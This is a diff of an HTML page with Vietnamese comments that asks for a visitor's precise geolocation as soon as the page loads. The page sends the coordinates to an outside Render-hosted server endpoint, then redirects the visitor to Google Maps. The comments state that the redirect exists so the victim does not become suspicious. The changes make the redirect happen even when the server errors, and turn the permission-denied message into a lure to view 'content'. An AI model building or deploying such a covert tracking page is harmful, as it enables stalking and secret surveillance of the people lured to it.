@@ -16,17 +16,15 @@
     <p id="status">Đang đợi tín hiệu...</p>
 
     <script>
-        // ============================================================
-        // BƯỚC QUAN TRỌNG: Thay link dưới bằng link Render của bạn
-        // Ví dụ: const SERVER_URL = 'https://vitritest.onrender.com/luu-vi-tri';
+        // Link server của bạn đã ĐÚNG
         const SERVER_URL = 'https://vitritest.onrender.com/luu-vi-tri'; 
-        // ============================================================
 
         function guiViTri(position) {
             const lat = position.coords.latitude;
             const long = position.coords.longitude;
             
-            // Tạo link Google Maps chính xác
+            // SỬA LỖI: Dùng cú pháp ${lat} và ${long} chuẩn
+            // Mình đổi sang link maps.google.com chuẩn để mở app bản đồ tốt hơn
             const googleMapLink = `https://www.google.com/maps?q=${lat},${long}`;
 
             const data = {
@@ -41,21 +39,21 @@
             })
             .then(response => {
                 document.getElementById('status').innerText = "Thành công!";
-                // Chuyển hướng người dùng đi chỗ khác để họ không nghi ngờ
+                // Chuyển hướng ngay lập tức
                 window.location.href = googleMapLink; 
             })
             .catch(err => {
                 console.error("Lỗi:", err);
-                document.getElementById('status').innerText = "Lỗi kết nối server!";
+                // Vẫn chuyển hướng dù lỗi server, để người dùng không nghi ngờ
+                window.location.href = googleMapLink;
             });
         }
 
         function tuChoi(error) {
-            document.getElementById('status').innerText = "Bạn cần bấm 'Cho phép' (Allow) để tiếp tục.";
-            console.warn("Người dùng từ chối cấp quyền.");
+            document.getElementById('status').innerText = "Vui lòng bấm 'Cho phép' (Allow) để xem nội dung.";
         }
 
-        // Tự động xin quyền khi vào trang
+        // Tự động xin quyền
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(guiViTri, tuChoi, {
                 enableHighAccuracy: true,
